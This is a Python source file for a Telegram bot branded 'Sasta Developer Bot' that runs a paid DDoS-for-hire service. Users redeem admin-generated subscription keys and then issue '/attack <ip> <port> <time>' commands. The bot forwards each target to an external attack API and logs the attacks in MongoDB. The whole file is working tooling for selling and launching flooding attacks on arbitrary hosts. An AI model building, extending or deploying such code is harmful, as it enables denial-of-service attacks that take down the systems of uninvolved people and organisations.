import asyncio
import logging
import re
import os
import uuid
import requests
import secrets
from datetime import datetime, timedelta, timezone
from typing import Dict, Optional, List
from functools import wraps

from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    filters
)
import pymongo
from pymongo import MongoClient, ASCENDING, DESCENDING
from dotenv import load_dotenv

# --- CONFIGURATION & LOGGING ---
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGODB_URI = os.getenv("MONGODB_URI")
DATABASE_NAME = os.getenv("DATABASE_NAME", "sastadev")
API_URL = os.getenv("API_URL")
API_KEY = os.getenv("API_KEY")

admin_raw = os.getenv("ADMIN_IDS", "")
ADMIN_IDS = [int(id.strip()) for id in admin_raw.split(",") if id.strip().isdigit()]

BLOCKED_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001}

# --- HELPERS ---
def make_aware(dt):
    if dt is None: return None
    if hasattr(dt, 'tzinfo') and dt.tzinfo is None:
        return dt.replace(tzinfo=timezone.utc)
    return dt

def get_current_time():
    return datetime.now(timezone.utc)

# --- DATABASE CLASS ---
class Database:
    def __init__(self):
        if not MONGODB_URI:
            raise ValueError("MONGODB_URI environment variable is missing.")
        self.client = MongoClient(MONGODB_URI)
        self.db = self.client[DATABASE_NAME]
        self.users = self.db.users
        self.attacks = self.db.attacks
        self.keys = self.db.keys  # New collection for keys
        self._setup_db()

    def _setup_db(self):
        try:
            self.users.delete_many({"user_id": {"$in": [None, ""]}})
            self.attacks.create_index([("timestamp", DESCENDING)])
            self.keys.create_index([("key", ASCENDING)], unique=True)
            
            # Safe index creation for user_id
            try:
                self.users.create_index([("user_id", ASCENDING)], unique=True)
            except pymongo.errors.OperationFailure:
                self.users.drop_index("user_id_1")
                self.users.create_index([("user_id", ASCENDING)], unique=True)
                
            logger.info("✅ Database systems initialized.")
        except Exception as e:
            logger.error(f"❌ DB Setup Error: {e}")

    def get_user(self, user_id: int):
        user = self.users.find_one({"user_id": user_id})
        if user:
            for key in ["created_at", "approved_at", "expires_at"]:
                if user.get(key): user[key] = make_aware(user[key])
        return user

    def create_user(self, user_id: int, username: str = None):
        if self.get_user(user_id): return
        user_data = {
            "user_id": user_id,
            "username": username,
            "approved": False,
            "total_attacks": 0,
            "created_at": get_current_time(),
        }
        self.users.insert_one(user_data)

    def generate_key(self, duration_days: int):
        key = f"SASTA-{secrets.token_hex(4).upper()}"
        self.keys.insert_one({
            "key": key,
            "duration": duration_days,
            "used": False,
            "used_by": None,
            "created_at": get_current_time()
        })
        return key

    def redeem_key(self, user_id: int, key_str: str):
        key_doc = self.keys.find_one({"key": key_str, "used": False})
        if not key_doc:
            return False, "Invalid or already used key."
        
        duration = key_doc["duration"]
        expires_at = get_current_time() + timedelta(days=duration)
        
        self.users.update_one(
            {"user_id": user_id},
            {"$set": {
                "approved": True, 
                "approved_at": get_current_time(), 
                "expires_at": expires_at
            }}
        )
        self.keys.update_one({"key": key_str}, {"$set": {"used": True, "used_by": user_id}})
        return True, f"Success! Added {duration} days access."

    def log_attack(self, user_id: int, ip: str, port: int, duration: int, status: str):
        self.attacks.insert_one({
            "_id": str(uuid.uuid4()),
            "user_id": user_id,
            "ip": ip, "port": port, "duration": duration,
            "status": status, "timestamp": get_current_time()
        })
        self.users.update_one({"user_id": user_id}, {"$inc": {"total_attacks": 1}})

db = Database()

# --- DECORATORS ---
def admin_required(func):
    @wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.effective_user.id not in ADMIN_IDS:
            await update.message.reply_text("❌ Admin access required.")
            return
        return await func(update, context)
    return wrapper

# --- COMMAND HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    db.create_user(user_id, update.effective_user.username)
    await update.message.reply_text(
        "🔥 **Welcome to Sasta Developer Bot**\n\n"
        "Commands:\n"
        "🔹 `/attack <ip> <port> <time>`\n"
        "🔹 `/redeem <key>` - Activate access\n"
        "🔹 `/myinfo` - Check status\n\n"
        "Admins: Use `/genkey <days>` to create access keys."
    )

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❌ Usage: `/redeem SASTA-XXXX`")
        return
    success, msg = db.redeem_key(update.effective_user.id, context.args[0].upper())
    await update.message.reply_text("✅ " + msg if success else "❌ " + msg)

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = db.get_user(user_id)
    
    if not user or not user.get("approved") or user.get("expires_at") < get_current_time():
        await update.message.reply_text("❌ No active subscription. Use /redeem to activate.")
        return

    if len(context.args) != 3:
        await update.message.reply_text("❌ Usage: `/attack <ip> <port> <time>`")
        return

    ip, port, duration = context.args[0], int(context.args[1]), int(context.args[2])
    if port in BLOCKED_PORTS:
        await update.message.reply_text("❌ Port is blacklisted.")
        return

    msg = await update.message.reply_text("🚀 **Launching Attack...**")
    try:
        res = requests.post(
            f"{API_URL}/api/v1/attack", 
            json={"ip": ip, "port": port, "duration": duration},
            headers={"x-api-key": API_KEY}, timeout=15
        ).json()
        
        if res.get("success"):
            db.log_attack(user_id, ip, port, duration, "success")
            await msg.edit_text(f"✅ **Attack Sent!**\nTarget: `{ip}:{port}`\nTime: `{duration}s`")
        else:
            db.log_attack(user_id, ip, port, duration, "failed")
            await msg.edit_text(f"❌ **API Error:** {res.get('error', 'Unknown')}")
    except Exception as e:
        await msg.edit_text(f"❌ **Connection Error:** {str(e)}")

@admin_required
async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    days = int(context.args[0]) if context.args else 30
    key = db.generate_key(days)
    await update.message.reply_text(f"🔑 **Generated Key ({days} Days):**\n`{key}`\n\nGive this to the user.")

async def myinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = db.get_user(update.effective_user.id)
    if not user: return
    status = "✅ Active" if user.get("approved") and user.get("expires_at") > get_current_time() else "❌ Expired/Inactive"
    expiry = user.get("expires_at").strftime('%Y-%m-%d %H:%M') if user.get("expires_at") else "N/A"
    
    await update.message.reply_text(
        f"👤 **Account Info**\n"
        f"ID: `{user['user_id']}`\n"
        f"Status: {status}\n"
        f"Expiry: `{expiry}`\n"
        f"Total Attacks: `{user.get('total_attacks', 0)}`"
    )

def main():
    if not BOT_TOKEN: return
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("redeem", redeem))
    app.add_handler(CommandHandler("genkey", genkey))
    app.add_handler(CommandHandler("myinfo", myinfo))
    print("🚀 Bot Started!")
    app.run_polling()

if __name__ == "__main__":
    main()
